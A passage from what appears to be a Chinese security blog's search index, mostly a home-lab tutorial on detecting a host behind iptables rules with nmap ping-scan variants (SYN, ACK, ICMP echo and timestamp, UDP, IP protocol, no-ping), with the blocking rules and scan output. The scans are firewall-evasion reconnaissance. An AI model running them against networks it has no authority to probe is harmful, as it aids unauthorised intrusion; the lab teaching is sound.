seconds</span><br><span class="line">kali-team@Kali-Team:~$</span><br></pre></td></tr></table></figure></li><li><p>现在我使用TCP SYN数据包Ping扫描绕过防火墙的规则，因为我们使用了-PS参数，-PS默认在80端口发送TCP SYN数据包；我们还可以指定端口，比如-PS443(指定443)端口。看下面的图就比较清楚了。</p></li></ul><h3 id="过滤TCP-SYN-Ping扫描"><a href="#过滤TCP-SYN-Ping扫描" class="headerlink" title="过滤TCP SYN Ping扫描"></a>过滤TCP SYN Ping扫描</h3><ul><li><p>升级一下，绕过管理员把TCP SYN数据包里的SYN数据包都过滤了怎么办？</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -I INPUT -p tcp --tcp-flags ALL SYN -j DROP</span><br></pre></td></tr></table></figure></li><li><p>现在Nmap有扫描不到主机是否存活了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP -PS 192.168.43.132 -<span class="built_in">disable</span>-arp-ping</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-07 21:01 CST</span><br><span class="line">Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (0 hosts up) scanned <span class="keyword">in</span> 2.09 seconds</span><br><span class="line">kali-team@Kali-Team:~$</span><br></pre></td></tr></table></figure></li></ul><h3 id="使用TCP-ACK-Ping绕过TCP-SYN-Ping"><a href="#使用TCP-ACK-Ping绕过TCP-SYN-Ping" class="headerlink" title="使用TCP ACK Ping绕过TCP SYN Ping"></a>使用TCP ACK Ping绕过TCP SYN Ping</h3><ul><li><p>为了绕过它，我们使用TCP ACK数据包的Ping扫描，所有要使用-PA参数来在80端口发送TCP ACK数据包，和上面一样也可以指定端口。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP -PA 192.168.43.132 -<span class="built_in">disable</span>-arp-ping</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-07 21:06 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.132</span><br><span class="line">Host is up (0.00082s latency).</span><br><span class="line">MAC Address: 08:00:27:7D:2A:31 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.36 seconds</span><br><span class="line">kali-team@Kali-Team:~$</span><br></pre></td></tr></table></figure></li><li><p>现在有发现可以检测到主机在线了。在上面的图片中你可以看到ACK数据包发送到80端口。目标以RST数据包回复。</p><h3 id="再拦截上面的TCP-ACK-Ping扫描"><a href="#再拦截上面的TCP-ACK-Ping扫描" class="headerlink" title="再拦截上面的TCP ACK Ping扫描"></a>再拦截上面的TCP ACK Ping扫描</h3></li><li>这次把防火墙设置成TCP连接中的ACK数据包都拦截掉。<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -I INPUT -p tcp --tcp-flags ALL ACK -j DROP</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP -PA 192.168.43.132 -<span class="built_in">disable</span>-arp-ping</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-07 21:18 CST</span><br><span class="line">Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (0 hosts up) scanned <span class="keyword">in</span> 2.10 seconds</span><br><span class="line">kali-team@Kali-Team:~$</span><br></pre></td></tr></table></figure><ul><li><p>然后上次的方法又不行了是吧，然而目标主机并不鸟我，请忽视第三个ssh协议的，那是我ssh登录上执行命令的。</p><h3 id="使用ICMP回环绕过TCP-ACK-Ping"><a href="#使用ICMP回环绕过TCP-ACK-Ping" class="headerlink" title="使用ICMP回环绕过TCP ACK Ping"></a>使用ICMP回环绕过TCP ACK Ping</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP -PE 192.168.43.132 -<span class="built_in">disable</span>-arp-ping</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-07 21:25 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.132</span><br><span class="line">Host is up (0.00081s latency).</span><br><span class="line">MAC Address: 08:00:27:7D:2A:31 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.49 seconds</span><br><span class="line">kali-team@Kali-Team:~$</span><br></pre></td></tr></table></figure></li><li><p>我们要用Ping扫描ICMP数据包来绕过刚刚的规则，所以我们要使用-PE参数发送ICMP回环数据包。</p><h3 id="再拦截上面的ICMP回环"><a href="#再拦截上面的ICMP回环" class="headerlink" title="再拦截上面的ICMP回环"></a>再拦截上面的ICMP回环</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -A INPUT -p icmp -m icmp --icmp-type <span class="built_in">echo</span>-request -j DROP</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP -PE 192.168.43.132 -<span class="built_in">disable</span>-arp-ping</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-07 21:42 CST</span><br><span class="line">Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (0 hosts up) scanned <span class="keyword">in</span> 2.09 seconds</span><br><span class="line">kali-team@Kali-Team:~$</span><br></pre></td></tr></table></figure><ul><li><p>目标也没有回应，拦截成功。</p><h3 id="使用ICMP时间戳Ping绕过ICMP回环"><a href="#使用ICMP时间戳Ping绕过ICMP回环" class="headerlink" title="使用ICMP时间戳Ping绕过ICMP回环"></a>使用ICMP时间戳Ping绕过ICMP回环</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP -PP 192.168.43.132 -<span class="built_in">disable</span>-arp-ping</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-07 21:46 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.132</span><br><span class="line">Host is up (0.00087s latency).</span><br><span class="line">MAC Address: 08:00:27:7D:2A:31 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.35 seconds</span><br><span class="line">kali-team@Kali-Team:~$</span><br></pre></td></tr></table></figure></li><li><p>我们使用Ping扫描和ICMP数据包来绕，所以我们要使用-PP参数来发送ICMP时间戳数据包。</p></li></ul><h3 id="我再拦截所有ICMP扫描"><a href="#我再拦截所有ICMP扫描" class="headerlink" title="我再拦截所有ICMP扫描"></a>我再拦截所有ICMP扫描</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -I INPUT -p ICMP -j DROP</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP -PP 192.168.43.132 -<span class="built_in">disable</span>-arp-ping</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-07 21:59 CST</span><br><span class="line">Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (0 hosts up) scanned <span class="keyword">in</span> 2.10 seconds</span><br><span class="line">kali-team@Kali-Team:~$</span><br></pre></td></tr></table></figure><ul><li>看，又发现不了主机了，拦截也起作用了。注意：这会把你的ssh断开，不让你连接。可以输入下面命令清空防火墙规则。<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -F</span><br></pre></td></tr></table></figure></li></ul><h3 id="使用UDP绕ICMP扫描"><a href="#使用UDP绕ICMP扫描" class="headerlink" title="使用UDP绕ICMP扫描"></a>使用UDP绕ICMP扫描</h3><ul><li><p>上面我们已经学了很多种检测主机是否存活的方法了，就上一个防火墙的配置已经把ICMP扫描拦截了，或者把TCP的数据包拦截了，这样我们就很难知道主机是否存活。到这里我们来学习另一种方式：UDP扫描，所以我们要用-PU参数。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP -PU 192.168.43.132 -<span class="built_in">disable</span>-arp-ping</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-07 22:11 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.132</span><br><span class="line">Host is up (0.00086s latency).</span><br><span class="line">MAC Address: 08:00:27:7D:2A:31 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.35 seconds</span><br><span class="line">kali-team@Kali-Team:~$</span><br></pre></td></tr></table></figure></li><li><p>看到目标回复<code>Destination unreachable (Port unreachable)</code>没，这就表示主机还活着。</p><h3 id="再再把UDP拦截了"><a href="#再再把UDP拦截了" class="headerlink" title="再再把UDP拦截了"></a>再再把UDP拦截了</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -I INPUT -p ICMP -j DROP</span><br><span class="line">sudo iptables -I INPUT -p tcp --tcp-flags ALL ACK --dport 80 -j DROP</span><br><span class="line">sudo iptables -I INPUT -p tcp --tcp-flags ALL SYN --dport 443 -j DROP</span><br><span class="line">sudo iptables -I INPUT -p udp -j DROP</span><br></pre></td></tr></table></figure></li><li><p>配置好上面的就反人类了。UDP扫描没发现主机存活。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP -PU 192.168.43.132 -<span class="built_in">disable</span>-arp-ping</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-07 22:22 CST</span><br><span class="line">Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (0 hosts up) scanned <span class="keyword">in</span> 2.10 seconds</span><br><span class="line">kali-team@Kali-Team:~$</span><br></pre></td></tr></table></figure></li></ul><h3 id="利用协议绕过UDP和Ping"><a href="#利用协议绕过UDP和Ping" class="headerlink" title="利用协议绕过UDP和Ping"></a>利用协议绕过UDP和Ping</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP -PO 192.168.43.132 -<span class="built_in">disable</span>-arp-ping</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-07 22:25 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.132</span><br><span class="line">Host is up (0.00078s latency).</span><br><span class="line">MAC Address: 08:00:27:7D:2A:31 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.35 seconds</span><br><span class="line">kali-team@Kali-Team:~$</span><br></pre></td></tr></table></figure><ul><li>在ICMP TCP和UDP都被拦截时，我们可以用-PO参数发送有IP头中特定协议号的IP数据包，如果没有指定协议，则发送多个用于ICMP，IGMP和IP-in-IP协议。</li><li><p>在上面抓包可以看出来：</p><blockquote><ol><li>发送ICMP Echo到目标主机</li><li>向目标发送IGMP查询</li><li>发送IPv4到目标主机</li><li>收到ICMP <code>Destination unreachable (Port unreachable)</code></li></ol></blockquote><h3 id="最后一个禁止IP协议扫描"><a href="#最后一个禁止IP协议扫描" class="headerlink" title="最后一个禁止IP协议扫描"></a>最后一个禁止IP协议扫描</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -I INPUT -p ICMP -j DROP</span><br><span class="line">sudo iptables -I INPUT -p tcp --tcp-flags ALL ACK --dport 80 -j DROP</span><br><span class="line">sudo iptables -I INPUT -p tcp --tcp-flags ALL SYN --dport 443 -j DROP</span><br><span class="line">sudo iptables -I INPUT -p udp -j DROP</span><br><span class="line">sudo iptables -I INPUT -p IP -j DROP</span><br></pre></td></tr></table></figure></li><li><p>就是在上一个加上拦截IP协议的就可以了。基本可以拦截很多方式的扫描了。</p></li><li><p>这个更反人类是吧，那怎么绕呢？</p><h3 id="使用NO-Ping绕过IP协议"><a href="#使用NO-Ping绕过IP协议" class="headerlink" title="使用NO Ping绕过IP协议"></a>使用NO Ping绕过IP协议</h3></li><li><p>当Ping扫描被拦截就用-PN参数，不用Ping扫描啊，这种方法可以判断主机的状态时up还是down。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sP -PN 192.168.43.132 -<span class="built_in">disable</span>-arp-ping</span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2018-03-07 22:41 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.132</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.04 seconds</span><br><span class="line">kali-team@Kali-Team:~$</span><br></pre></td></tr></table></figure></li><li><p>发现啥都没有，完了！！！</p></li><li>-PN参数是跳过主机发现，假定主机时在线的，再执行后面的扫描，比如端口扫描，版本探测等等。因为这些测试时在主机为up的前提下执行的。所以会无视防火墙继续执行后面的测试。但是这应该比较费时间，本来主机都不在线，你又去扫了一遍。如果你是想：有杀过不放过的话可以试试。<h3 id="0x03-后续"><a href="#0x03-后续" class="headerlink" title="0x03 后续"></a>0x03 后续</h3></li><li>写了足足两天，其中docker里的iptables报错问题没解决，后面搭建了一台32位的Ubuntu，凑合用了。</li><li>今天课程排满了，吃完饭19:00开始写–现在到了23:00，不写了，去洗澡！！</li></ul><p>参考：<a href="https://www.hackingarticles.in/understanding-guide-nmap-ping-scan-firewall-bypass/" target="_blank" rel="noopener">Understanding Guide for Nmap Ping Scan (Firewall Bypass)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://app.netlify.com/sites/kali-team/deploys" target="_blank" rel="noopener"><img src="https://api.netlify.com/api/v1/badges/23862cd4-dbf7-4795-bf48-7e26cf3eb2bf/deploy-status" alt="Netlify Status"></a></p><h2 id="联系方式："><a href="#联系方式：" class="headerlink" title="联系方式："></a>联系方式：</h2><ul><li>ID：三米前有蕉皮</li><li>Email：<a href="mailto:root@kali-team.cn" target="_blank" rel="noopener">root@kali-team.cn</a></li><li>WeChat：Kali-Team</li></ul><hr><ul><li>说出来你们可能不信，因为我快没钱续费域名了[捂脸]</li><li>以后会多更新一些文章。</li></ul>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>留言</title>
      <link href="/comment/index.html"/>
      <url>/comment/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>实验室</title>
      <link href="/lab/index.html"/>
      <url>/lab/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Search</title>
      <link href="/search/index.html"/>
      <url>/search/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
